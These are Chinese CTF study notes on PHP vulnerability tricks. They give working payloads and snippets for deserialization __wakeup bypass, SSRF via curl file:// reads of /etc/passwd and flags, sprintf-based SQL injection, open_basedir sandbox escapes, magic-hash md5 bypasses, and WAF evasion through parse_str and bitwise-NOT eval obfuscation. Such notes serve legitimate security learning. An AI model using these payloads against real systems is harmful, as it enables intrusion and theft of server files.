# php漏洞

## 收藏

 https://www.restran.net/2016/09/26/php-security-notes/ 

 [https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/](https://hackfun.org/2018/01/09/CTF中常见PHP特性学习笔记/) 



## php弱类型



### 字符串==true为真

### "0exxxx"会被看做数字



## 函数利用

### move_uploaded_file %00截断

1、漏洞影响版本必须在5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7

2.move_uploaded_file($_FILES['x']['tmp_name'],"/tmp/test.php\x00.jpg")



### preg_replace_callback

```php
<?php
preg_replace_callback("/.*/e",'eval()','aaaa');
?>
```



利用条件:php版本=7

### eval利用

#### 被双引号包围



### curl_exec

#### 利用file://伪协议可以任意文件读取

漏洞代码

```php
function test() {
    	$a=$_GET['a']
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this->a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
```

利用方式http://47.97.253.115:10006/?z=file://localhost/flag



#### 利用二次url编码绕过字符串限制

因为curl_exec会对url进行解码,所以我们可以通过对传递字符串二次编码,来绕过字符串限制

漏洞代码

```php
<?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this->a, 'flag');
        if($b) {
            die("Bye!");
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this->a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
    
    function __destruct(){
        $this->test();
    }
}

if (isset($_GET["z"])) {
    unserialize($_GET["z"]);
} else {
    highlight_file(__FILE__);
}
```

payload:

http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}

这里有一些坑就是:

1. 你不知道flag文件在哪个文件夹,结果最后就在根目录。。
2. 因为是二次编码所以要注意字符串的长度

### preg_replace()

preg_replace漏洞触发有两个前提：

1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令

2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：

3. php版本<7

4. ```php
   echo preg_replace('/test/e', 'phpinfo()', 'just test');
   //这样是可以执行命令的
   
   echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
   echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
   //这两种没有匹配上，所以返回值是第三个参数，不能执行命令
   ```

## 一些函数特性

### curl

file:///etc/passwd有时候不行

通常是file://localhost/etc/passwd

### unserialize和serialize对string的解析差异

http://www.vuln.cn/8102

PHP 在反序列化 string 时没有严格按照序列化格式 `s:x:"x"; `进行处理，没有对 `" `后面的是否存在 `;` 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。

### unserialize解析变量个数或字符串长度的特殊点

unserialize解析变量个数或字符串长度时,8与+8是相同效果的

如`O:4:'claa':0{}`===`O:+4:'claa':0{}`

### sprintf() 格式化字符串漏洞

>An optional padding specifier that says what character will be used for padding the results to the right string size. This may be a space character or a 0 (zero character). The default is to pad with spaces. An alternate padding character can be specified by prefixing it with a single quote (‘). See the examples below.

```php
<?php
$s = 'monkey';
$t = 'many monkeys';

printf("[%s]\n",      $s); // standard string output
printf("[%10s]\n",    $s); // right-justification with spaces
printf("[%-10s]\n",   $s); // left-justification with spaces
printf("[%010s]\n",   $s); // zero-padding works on strings too
printf("[%'#10s]\n",  $s); // use the custom padding character '#'
printf("[%10.10s]\n", $t); // left-justification but with a cutoff of 10 characters
?>

```

同时我们关注另一个特性，如果我们想用另外的顺序映射对应格式化点和参数我们可以使用以下的方法：

```php
<?php
    $location='this';
	$num=666
$format = 'The %1$s contains %1$d monkeys.
           That\'s a nice %2$s full of %2$d monkeys.';
echo sprintf($format, $num, $location);
?>
    /*
    The 666 contains 666 monkeys.
           That's a nice this full of 0 monkeys.    
    */
    
```

并且如果`%`后面跟了其他符号，会被直接无视。

如果我们能在格式化字符串中拼接`%‘ or 1=1#`，进入服务器后addslashes结果变成`%\' or 1=1#`，再拼接入待格式化的sql语句：

```sql
SELECT username, password FROM users where username='%\' or 1=1#'
```



因为`%\`不是任何一种输出类型，格式化后得到：

```sql
SELECT username, password FROM users where username='' or 1=1#'
```

成功逃逸
但是可能会出现php报错：`PHP Warning: sprintf(): Too few arguments`
可以使用这样的payload:`%1$'`不会引起相关报错

## 函数绕过

### 字符串==字符串

字符串==true恒为真

### array_search()

当php的array_search试图在数字数组中寻找字符串时，会把字符串变成0

### PHP反序列化绕过__wakeup方法

当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 **__wakeup** 函数的执行。

```php
<?php
    class xctf{ 
	public $flag = '111';
    public function __wakeup(){
	exit('bad requests');
		}
	}
	echo unserialize($_GET['code']);
    ?>
```

这题关键是绕过__wakeup()函数

**当反序列化字符串中，表示属性个数的值大于真实属性个数时**

正常:?code=O:**1**:"xctf":3:{s:4:"flag";s:3:"111";}

payload:?code=O:**4**:"xctf":3:{s:4:"flag";s:3:"111";}

### ereg()和eregi()绕过

1.Eregi匹配可以用%00截断  2.eregi匹配可用数组绕过  

### md5相关

1. md5和弱类型比较的联合利用

   ```php
   if($_GET['password']!='xxxxxx'&&md5('xxxxxx')==md5($_GET['password']))
       echo $flag;
   ```

   (0-9)e开头字符串会被认为是数字

   所以md5加密后为0e开头的字符串都相等

   >下列的字符串的MD5值都是0e开头的：
   >
   >QNKCDZO
   >
   >240610708
   >
   >s878926199a
   >
   >s155964671a
   >
   >s214587387a
   >
   >s214587387a

   也可以用数组绕过，md5()遇到数组返回null

2. ```php
   "select * from `admin` where password='".md5($pass,true)."'"
   ```
md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串
   
   > raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。
   
   特殊字符串:
   
   >129581926211651571912466741651878684928
   >ffifdyop



### strcmp

- 利用条件：
适用于5.3之前版本的php
- 接收到非字符串类型的变量会报错，并返回0

### 一些函数遇到非法类型的返回值

1. strpos()遇到数组返回null
2. md5():遇到数组返回null
3. eregi()/ereg()遇到数组返回null

## 一些有用的php语句

get_defined_functions()

scandir,file_get_contents('/proc/...')



### 绕过open_basedir

 https://www.leavesongs.com/bypass-open-basedir-readfile.html 

 https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html 

 [https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E6%96%B9%E5%BC%8F1%E2%80%94%E2%80%94DirectoryIterator-glob](https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/#方式1——DirectoryIterator-glob) 

#### 利用软链接

```php
<?php
symlink("abc/abc/abc/abc","tmplink"); 
symlink("tmplink/../../../etc/passwd", "exploit"); 
unlink("tmplink"); 
mkdir("tmplink");
```



#### 利用DirectoryIterator + Glob 直接列举目录



```php
<?php
printf('<b>open_basedir : %s </b><br />', ini_get('open_basedir'));
$file_list = array();
// normal files
$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {
    $file_list[] = $f->__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator("glob:///.*");
foreach($it as $f) {
    $file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
        echo "{$f}<br/>";
}
?>
```





#### realpath列举目录

```php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```



#### SplFileInfo::getRealPath列举目录

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
$basedir = 'D:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) { 
    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
    $re = $info->getRealPath();
    if ($re) {
        dump($re);
    }
}
function dump($s){
    echo $s . '<br/>';
    ob_flush();
    flush();
}
?>
```







## 文件包含漏洞

### php伪协议

**php://filter/read=convert.base64-encode/resource=**

### 配合文件上传的漏洞

- 文件上传后缀名绕过看web杂项

- 文件内容被更换

  - 如<?php ?>中的<?和?>被替换，可以用<script>标签绕过

  ```php+HTML
  <script langulage="php">
  system("ls");
  </script>
  ```

  -    ```php
       <? echo 'this is the simplest, an SGML processing instruction'; ?>
      <?= expression ?> This is a shortcut for "<? echo expression ?>"
      ```
     
  -    
  

​        利用条件：php.ini 配置文件中的指令 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) 打开后才可用

  -  <% echo 'You may optionally use ASP-style tags'; %>
        <%= $variable; # This is a shortcut for "<% echo . . ." %>  
  
      利用条件：php.ini 配置文件中的指令 [asp_tags](https://www.php.net/manual/zh/ini.core.php#ini.asp-tags) 打开后才可用。

## 杂

### '0xaa'可以被理解为数字(php7之前的版本)
所以'0xccccccccc'='54975581388'

### PHP解析字符串函数parse_str的特性

PHP将查询字符串(在URL或正文中)转换为$_GET或$_POST中的关联数组。例如:/ ?foo=bar被转换为Array([foo] => "bar")。查询字符串解析过程使用下划线删除或替换参数名称中的某些字符。例如/?%20news[id%00=42被转换为Array([news_id] => 42)。如果IDS / IPS或WAF在news_id参数中有一个用于阻止或记录非数字值的规则，则可以通过滥用此解析过程来绕过它，例如：/news.php?%20news[id%00=42"+AND+1=0–，在PHP中，%20news[id%00中的参数名称的值将存储到$_GET["news_id"]。

PHP需要将所有参数转换为一个有效的变量名，所以当解析查询字符串时，它主要做两件事:

1.删除初始空格；

2.将一些字符转换为下划线(包括空格)。

![](http://ww1.sinaimg.cn/large/006pWR9agy1g5zidv6umyj30rv0kbae4.jpg)

## 程序猿可能做的傻事

### header('Location: ./?failed=1');后面没加exit()

后面的代码还会执行



## tricks

### 利用`(~xxxxxx)(~xxxxx)`来绕过字符限制

eg .

```php

if(!preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($_GET['i'],$i,1)))
    eval($_GET['i']);
```

此时用%28%7E%8F%97%8F%96%91%99%90%29%28%29来绕过执行phpinfo()

```php
$str='phpinfo';
$payload="(~".(~$str).")()";
#$payload="(~".~$str.")(~".(~"HTTP_X").")";
for($i=0;$i<strlen($payload);$i++)
    if(preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',substr($payload,$i,1)))
        print("failed");
    else print("success\n");
print(($payload."\n"));
```





### 绕过字符限制

- 关键函数:end(),getallheaders(),pos()
- `~|^&`等运算符来绕过





### 绕过死亡exit

 https://www.leavesongs.com/PENETRATION/php-filter-magic.html 





### 利用php字符串解析特性绕过waf

https://www.freebuf.com/articles/web/213359.html

![](https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small)

![](https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small)



#### 例题

2019roarctf 

```php

<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```



题目在apache那里配了一个waf,过滤字符和不可打印字符,加上php的其他限制,导致利用运算符生成字符困难,但是apache的waf只能匹配到num,却无法匹配%20num,%20num在php中会被解析成num,最后成功绕过waf



